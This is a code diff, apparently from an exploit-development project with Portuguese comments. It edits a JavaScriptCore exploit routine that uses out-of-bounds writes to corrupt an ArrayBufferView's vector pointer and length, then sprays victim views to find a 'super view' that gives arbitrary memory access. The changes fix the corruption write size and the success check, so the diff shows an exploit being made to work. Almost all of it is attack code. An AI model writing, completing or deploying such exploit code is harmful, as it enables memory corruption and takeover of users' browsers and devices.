@@ -20,11 +20,11 @@ const CORRUPTION_OFFSET_TRIGGER_0x70 = 0x70;
 const CORRUPTION_VALUE_0x70 = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
 
 // Área no oob_array_buffer_real onde os metadados de uma view serão corrompidos
-const TARGET_METADATA_AREA_IN_OOB = 0x58; 
+const TARGET_METADATA_AREA_IN_OOB = 0x58;
 const TARGET_MVECTOR_OFFSET_IN_OOB = TARGET_METADATA_AREA_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x68
 const TARGET_MLENGTH_OFFSET_IN_OOB = TARGET_METADATA_AREA_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // 0x70
 
-const DESIRED_MVECTOR_VALUE  = AdvancedInt64.Zero;
+const DESIRED_MVECTOR_VALUE  = AdvancedInt64.Zero; // Este já é um AdvancedInt64 representando zero
 const DESIRED_MLENGTH_VALUE  = 0xFFFFFFFF;
 
 // Offset no oob_array_buffer_real onde plantaremos um JSCell FALSO para ler seu SID
@@ -77,15 +77,21 @@ export async function sprayAndInvestigateObjectExposure() {
 
         // 3. Corromper bytes em TARGET_METADATA_AREA_IN_OOB (0x58) para m_vector=0, m_length=MAX
         logS3(`PASSO 3: Corrompendo bytes em ${toHex(TARGET_MVECTOR_OFFSET_IN_OOB)} e ${toHex(TARGET_MLENGTH_OFFSET_IN_OOB)}...`, "info", FNAME_CURRENT_TEST);
-        oob_write_absolute(TARGET_MVECTOR_OFFSET_IN_OOB, DESIRED_MVECTOR_VALUE, 8);
-        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER_0x70, CORRUPTION_VALUE_0x70, 8); // Define m_length e m_mode em 0x58
+        oob_write_absolute(TARGET_MVECTOR_OFFSET_IN_OOB, DESIRED_MVECTOR_VALUE, 8); // DESIRED_MVECTOR_VALUE é AdvancedInt64.Zero
+        oob_write_absolute(TARGET_MLENGTH_OFFSET_IN_OOB, DESIRED_MLENGTH_VALUE, 4); // CORRIGIDO: Em logs anteriores parecia que 0x70 era CORRUPTION_OFFSET_TRIGGER_0x70, mas aqui o objetivo é m_length.
+                                                                               // A escrita em 0x70 com CORRUPTION_VALUE_0x70 de 8 bytes iria sobrescrever m_length e m_mode.
+                                                                               // Se o objetivo é apenas m_length, então apenas 4 bytes.
+                                                                               // A linha original era: oob_write_absolute(CORRUPTION_OFFSET_TRIGGER_0x70, CORRUPTION_VALUE_0x70, 8);
+                                                                               // Se CORRUPTION_OFFSET_TRIGGER_0x70 é o mesmo que TARGET_MLENGTH_OFFSET_IN_OOB,
+                                                                               // e DESIRED_MLENGTH_VALUE é o valor para m_length, então a escrita deve ser de 4 bytes.
         await PAUSE_S3(100);
 
         const val_mvec = oob_read_absolute(TARGET_MVECTOR_OFFSET_IN_OOB, 8);
         const val_mlen = oob_read_absolute(TARGET_MLENGTH_OFFSET_IN_OOB, 4);
         logS3(`  Bytes em ${toHex(TARGET_METADATA_AREA_IN_OOB)}: mvec=${val_mvec.toString(true)}, mlen=${toHex(val_mlen)}`, "info", FNAME_CURRENT_TEST);
 
-        if (!(val_mvec.isZero() && val_mlen === DESIRED_MLENGTH_VALUE)) {
+        // CORREÇÃO APLICADA AQUI:
+        if (!(val_mvec.low() === 0 && val_mvec.high() === 0 && val_mlen === DESIRED_MLENGTH_VALUE)) {
             logS3("    AVISO: Os bytes em 0x58 não foram corrompidos como esperado para m_vector=0, m_length=MAX.", "warn", FNAME_CURRENT_TEST);
         } else {
             logS3("    Bytes em 0x58 preparados com m_vector=0, m_length=MAX.", "good", FNAME_CURRENT_TEST);
@@ -94,7 +100,7 @@ export async function sprayAndInvestigateObjectExposure() {
         // 4. Tentar Identificar o "Super Array" (View)
         logS3(`PASSO 4: Tentando identificar uma "Super View"...`, "info", FNAME_CURRENT_TEST);
         const MARKER_VALUE = 0xBEEFBEEF;
-        const MARKER_TEST_OFFSET = 0xE0; 
+        const MARKER_TEST_OFFSET = 0xE0;
         const MARKER_TEST_INDEX = MARKER_TEST_OFFSET / 4;
 
         let original_value_at_marker = 0;
@@ -108,7 +114,7 @@ export async function sprayAndInvestigateObjectExposure() {
                     superArray = sprayedVictimViews[i];
                     superArrayIndex = i;
                     document.title = `SUPER VIEW[${i}] ATIVA!`;
-                    break; 
+                    break;
                 }
             } catch (e_access) { /* Ignora */ }
         }
